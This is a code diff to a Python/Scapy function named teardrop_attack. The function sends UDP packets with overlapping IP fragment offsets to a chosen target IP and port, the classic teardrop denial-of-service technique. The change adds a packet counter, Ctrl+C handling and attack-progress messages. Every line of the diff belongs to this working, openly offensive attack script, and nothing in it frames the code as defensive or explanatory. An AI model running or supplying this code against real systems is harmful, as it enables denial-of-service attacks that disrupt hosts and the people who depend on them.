@@ -26,30 +26,39 @@ def teardrop_attack(target_ip, target_port, limit_choice, limit_value):
         sys.exit(1)
 
     else:
-        ip = IP(dst=target_ip)
-        udp = UDP(dport=target_port)
+        try:
+            packet_count = 0
 
-        payload = b"\x00" * 800
+            ip = IP(dst=target_ip)
+            udp = UDP(dport=target_port)
 
-        # Set initial flags and fragment offset
-        ip.flags = "MF"
-        ip.frag = 0
+            payload = b"\x00" * 800
 
-        # Send initial packet
-        send(ip / udp / payload, verbose=False)
-        print("[+] Sending initial packet")
+            # Set initial flags and fragment offset
+            ip.flags = "MF"
+            ip.frag = 0
 
-        # Send overlapping fragments
-        fragment_offset = 3
-        print("[+] Sending packets with overlapping fragments")
-        for i in range(limit_value):
+            # Send initial packet
+            send(ip / udp / payload, verbose=False)
+            print("[+] Sending initial packet. Use Ctrl+C to exit attack.")
+
+            # Send overlapping fragments
+            fragment_offset = 3
+            print("[+] Sending packets with overlapping fragments.")
+            for i in range(limit_value):
+                ip.frag = fragment_offset
+                fragment_offset += 20
+                send(ip / udp / payload, verbose=False)
+                packet_count += 1
+
+            # Send final packet
+            print("[+] Sending final packet.")
+            ip.flags = 0
             ip.frag = fragment_offset
-            fragment_offset += 20
             send(ip / udp / payload, verbose=False)
 
-        # Send final packet
-        print("[+] Sending final packet")
-        ip.flags = 0
-        ip.frag = fragment_offset
-        send(ip / udp / payload, verbose=False)
-
+            sys.stdout.write(
+                f"\r[+] Attack finished packets sent {(packet_count+2)} packets. Press enter to exit.")
+            sys.stdout.flush()
+        except KeyboardInterrupt:
+            print("[+] Attack exited by Keyboard interrupt.")
